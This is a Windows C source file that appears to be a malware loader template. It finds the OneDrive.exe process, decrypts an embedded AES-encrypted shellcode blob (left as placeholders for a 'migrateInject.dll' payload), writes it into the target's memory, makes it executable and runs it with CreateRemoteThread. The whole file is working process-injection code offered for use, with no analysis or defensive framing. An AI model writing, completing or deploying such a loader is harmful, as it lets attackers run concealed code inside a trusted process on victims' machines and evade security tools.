#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

unsigned char AESkey[] = { 0 }; //place key of migrateInject.dll here
unsigned char payload[] = { 0 }; //place encrypted shellcode of migrateInject.dll here
unsigned int payload_len = sizeof(payload);
unsigned int key_len = sizeof(AESkey);


int FindProcess(char * pName){
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hProcessSnap == INVALID_HANDLE_VALUE)
		return NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32 );

	if( !Process32First( hProcessSnap, &pe32 )){
		CloseHandle(hProcessSnap);
		return NULL;
	}
	
	do {
				
		if(strcmpi(pName, pe32.szExeFile) == 0) return pe32.th32ProcessID;
		
	} while (Process32Next(hProcessSnap,&pe32));
		pe32.th32ProcessID;
		
	
	return 0;
}

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int Inject(HANDLE hProcess){
	
	HANDLE hThread;
	LPVOID rem_exec;
	DWORD oldProtect;
	
	rem_exec = VirtualAllocEx(hProcess, 0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt( (char *)payload, payload_len, (char *)AESkey, key_len); 
	WriteProcessMemory(hProcess, rem_exec, payload, payload_len, 0);
	if (!VirtualProtectEx(hProcess, rem_exec, payload_len, PAGE_EXECUTE_READWRITE, &oldProtect)) return 1;
	hThread = CreateRemoteThread(hProcess, 0,0, (LPTHREAD_START_ROUTINE) rem_exec,0,0,0);	
	if (!hThread) return 1;

	return 0;
}

int main(){

	char pName[] = "OneDrive.exe";
	int PID = FindProcess(pName);
	
	HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, 0, PID);
	
	if (hProcess != NULL) {
		Inject(hProcess);
		CloseHandle(hProcess);
		return 0;
	}
	
	return 1;

}